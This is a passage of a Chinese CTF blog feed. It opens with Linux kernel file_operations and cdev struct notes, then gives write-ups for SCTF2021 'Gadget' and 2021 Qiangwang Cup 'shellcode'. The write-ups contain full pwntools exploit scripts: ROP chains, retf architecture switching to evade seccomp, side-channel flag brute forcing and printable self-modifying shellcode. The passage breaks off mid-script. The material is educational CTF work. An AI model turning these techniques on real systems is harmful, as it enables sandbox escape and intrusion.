class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">void</span> (*splice_eof)(<span class="keyword">struct</span> file *file);</span><br><span class="line"><span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line"><span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">  <span class="type">loff_t</span> len);</span><br><span class="line"><span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line"><span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line"><span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line"><span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line"><span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span> (*uring_cmd)(<span class="keyword">struct</span> io_uring_cmd *ioucmd, <span class="type">unsigned</span> <span class="type">int</span> issue_flags);</span><br><span class="line"><span class="type">int</span> (*uring_cmd_iopoll)(<span class="keyword">struct</span> io_uring_cmd *, <span class="keyword">struct</span> io_comp_batch *,</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> poll_flags);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>有点像proc_operations的plus版</p><p><strong>cdev</strong></p><p><code>cdev</code> 结构体是 Linux 内核中用于表示字符设备的结构体。它包含了字符设备的一些重要信息和操作函数，用于向内核注册和管理字符设备。下面是 <code>cdev</code> 结构体的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="type">dev_t</span> dev;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p><code>cdev</code> 结构体的主要成员包括：</p><ol><li><strong><code>struct kobject kobj</code>：</strong> 用于实现内核对象，与 sysfs 文件系统相关，提供一种在用户空间访问设备信息的机制。</li><li><strong><code>struct module *owner</code>：</strong> 拥有该字符设备的内核模块。</li><li><strong><code>const struct file_operations *ops</code>：</strong> 与字符设备关联的文件操作结构体，包含了指向设备的操作函数指针，如 <code>open</code>、<code>read</code>、<code>write</code>、<code>release</code> 等。</li><li><strong><code>struct list_head list</code>：</strong> 用于将 <code>cdev</code> 结构体链接到其他设备结构体的链表。</li><li><strong><code>dev_t dev</code>：</strong> 字符设备的设备号，包括主设备号和次设备号。</li><li><strong><code>unsigned int count</code>：</strong> 设备号的数量，通常为 1。</li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>内核pwn其实与用户态pwn并无太大的差异</p><p>就是通过编译执行二进制程序触发加载在内核中的模块存在的漏洞</p><p>想办法完成提权,然后再返回到用户态下getshell</p>]]></content>
    
    
    <summary type="html">从两道例题初步理解内核pwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>杂题录</title>
    <link href="https://ixout.github.io/posts/4584/"/>
    <id>https://ixout.github.io/posts/4584/</id>
    <published>2023-12-11T13:13:24.000Z</published>
    <updated>2024-04-18T10:35:03.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SCTF2021-Gadget"><a href="#SCTF2021-Gadget" class="headerlink" title="SCTF2021 Gadget"></a>SCTF2021 Gadget</h1><p><strong>标签:retf|侧信道攻击|沙盒</strong></p><p>程序是静态链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/gadget&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x25 0x03 0x00 0x40000000  if (A &gt; 0x40000000) goto 0005</span><br><span class="line"> 0002: 0x15 0x03 0x00 0x00000005  if (A == fstat) goto 0006</span><br><span class="line"> 0003: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0006</span><br><span class="line"> 0004: 0x15 0x01 0x00 0x00000025  if (A == alarm) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure><p>程序有seccomp只允许三个系统调用</p><p>传统的orw,因为只有<code>read</code>，<code>open</code>和<code>write</code>都被禁用而无法使用。</p><p>再回到程序本身程序读取时存在栈溢出,这是主要的漏洞点</p><p>不过可以观察到沙盒并没有限制系统的ARCH,同时fstat的系统调用号在32位中恰好是open的系统调用</p><p>搜索gadget,可以发现存在retf,retf可以用来切换32位模式(ropper搜索并没有找到这个gadget,但ROPgadget找到了,ropper也可以找到不过要用—instructions选项,因此找gadget还是要小心一点)</p><p>此时open的问题解决了,但还有一个问题,就是程序没有输出,一个可行的方案是采用侧信道的方式逐个输出</p><blockquote><p>侧信道攻击：在程序无法回显时，通过程序反馈的信息对进行flag逐位爆破。</p></blockquote><p>恰好程序中有这么一段gadget</p><p><code>cmp byte ptr [rax - 0x46], cl; push rbp; ret 0x5069;</code></p><p>和一段无限循环的代码</p><p><code>.text:0000000000405837 EB FE                         jmp     short loc_405837</code></p><p>用这两部分代码来探测是否爆破成功</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">bss_addr = elf.bss() + <span class="number">0x500</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rbx_r14_r15_rbp_ret = <span class="number">0x403072</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rdi_rbp_ret = <span class="number">0x401734</span></span><br><span class="line">pop_rdi_jmp_rax = <span class="number">0x402be4</span></span><br><span class="line">pop_rsi_r15_rbp_ret = <span class="number">0x401732</span></span><br><span class="line">mov_rsi_r15_mov_rdx_r12_call_r14 = <span class="number">0x402c04</span> <span class="comment"># call -&gt; push + jmp</span></span><br><span class="line">pop_r12_r14_r15_rbp_ret = <span class="number">0x40172f</span></span><br><span class="line">pop_rsp_ret = <span class="number">0x409d1c</span> <span class="comment"># mov edi,...</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">syscall_pop_rbp_ret = <span class="number">0x401165</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">retf_addr = <span class="number">0x4011ed</span></span><br><span class="line">cmp_addr = <span class="number">0x408266</span> <span class="comment"># cmp byte ptr [rax - 0x46], cl ; push rbp ; ret 0x5069</span></span><br><span class="line">jnz_addr = <span class="number">0x405831</span> <span class="comment"># jnz  0x405837</span></span><br><span class="line">loop = <span class="number">0x405837</span> <span class="comment"># jmp  0x405837</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">index, char</span>):</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_rbp_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(pop_r12_r14_r15_rbp_ret) + p64(<span class="number">0x100</span>) + p64(syscall_pop_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(mov_rsi_r15_mov_rdx_r12_call_r14) + p64(pop_rsp_ret) + p64(bss_addr + <span class="number">8</span>)</span><br><span class="line">io.send(payload.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span> + p64(pop_rax_ret) + p64(<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbx_r14_r15_rbp_ret) + p64(bss_addr) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(pop_rcx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(retf_addr) + p32(int_0x80_ret) + p32(<span class="number">0x23</span>)</span><br><span class="line">payload += p32(retf_addr) + p32(pop_rax_ret) + p32(<span class="number">0x33</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi_rbp_ret) + p64(<span class="number">3</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_rbp_ret) + p64(bss_addr + <span class="number">0x200</span>) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(syscall_pop_rbp_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(bss_addr + <span class="number">0x200</span> + <span class="number">0x46</span> + index)</span><br><span class="line">payload += p64(pop_rcx_ret) + p64(char)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(jnz_addr)</span><br><span class="line">payload += p64(cmp_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">left, right = <span class="number">0</span>, <span class="built_in">len</span>(possible_list)-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> possible_list :</span><br><span class="line">io = process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">pwn(pos, <span class="built_in">ord</span>(i))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">flag += i</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">io.close()</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span> :</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos = pos + <span class="number">1</span></span><br><span class="line">success(flag)</span><br></pre></td></tr></table></figure><p>当爆破成功时,程序就会段错误,那么调用recv时就会立即捕获到错误,以此判断成功</p><p>当爆破失败时,程序就会进入无限循环,从而自行结束开始下一次运行</p><h1 id="2021强网杯-shellcode"><a href="#2021强网杯-shellcode" class="headerlink" title="2021强网杯 shellcode"></a>2021强网杯 shellcode</h1><p><strong>标签:retf|侧信道攻击|沙盒|可见字符shellcode|SMC</strong></p><p>这一题与上一题一个套路</p><p>程序就只由一段代码构成,看来应该是手搓的elf</p><p>开启了沙盒只允许有限几个系统调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure><p>程序执行的内容很简单</p><p>mmap分配一块rwx的内存,向其中读入数据作为shellcode运行</p><p>不过限制读入的shellcode必须要由可见字符构成,这个限制就使得很多汇编代码无法使用,包括syscall等等,可以使用smc绕过</p><p>延续上一题的思路需要使用retf,但是这题与上一题不同在于其没有bss段,所以在切换系统宽度时会出错</p><p>这时候可以自己指定地址mmap一块内存</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;-0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode_open_x86 = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*fp = open(&quot;flag&quot;)*/</span></span><br><span class="line"><span class="string">mov esp,0x40404140</span></span><br><span class="line"><span class="string">push 0x67616c66</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mov eax,5</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">push 0x33</span></span><br><span class="line"><span class="string">push 0x4040405E</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(fp,buf,0x70)*/</span></span><br><span class="line"><span class="string">mov rdi,3</span></span><br><span class="line"><span class="string">mov rsi,rsp</span></span><br><span class="line"><span class="string">mov rdx,0x70</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read_flag += <span class="string">F&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">cmp byte ptr[rsi+<span class="subst">&#123;pos&#125;</span>], <span class="subst">&#123;char&#125;</span></span></span><br><span class="line"><span class="string">ja loop</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    </span><br><span class="line">shellcode_open_x86 = asm(shellcode_open_x86, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode_read_flag = asm(shellcode_read_flag, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span></span><br><span class="line"><span class="string">push 0x40404040 /*set rdi*/</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x7e /*set rsi*/</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set rdx*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x47</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40 /*set r8*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rax /*set r9*/</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/*syscall*/</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x31],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x32],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x22 /*set rcx*/</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x40/*set rax*/</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x49</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/*read(0,0x40404040,0x70)*/</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">push 0x40</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">push 0x70</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">push 0x5d</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x55],cl</span></span><br><span class="line"><span class="string">push 0x5f</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x56],cl</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x70</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor al,0x40</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x72</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x68</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">xor byte ptr[rax+0x3a],cl</span></span><br><span class="line"><span class="string">push 0x47</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x48</span></span><br><span class="line"><span class="string">pop rcx</span></span><br><span class="line"><span class="string">sub byte ptr[rax+0x3b],cl</span></span><br><span class="line"><span class="string">push 0x23</span></span><br><span class="line"><span class="string">push 0x40404040</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">pos, char</span>):</span><br><span class="line">shellcode = shellcode_mmap</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_read</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode += shellcode_retfq</span><br><span class="line">shellcode += syscall_retfq</span><br><span class="line">shellcode = asm(shellcode, arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(shellcode_open_x86 + shellcode_read_flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">start = time.time()</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span 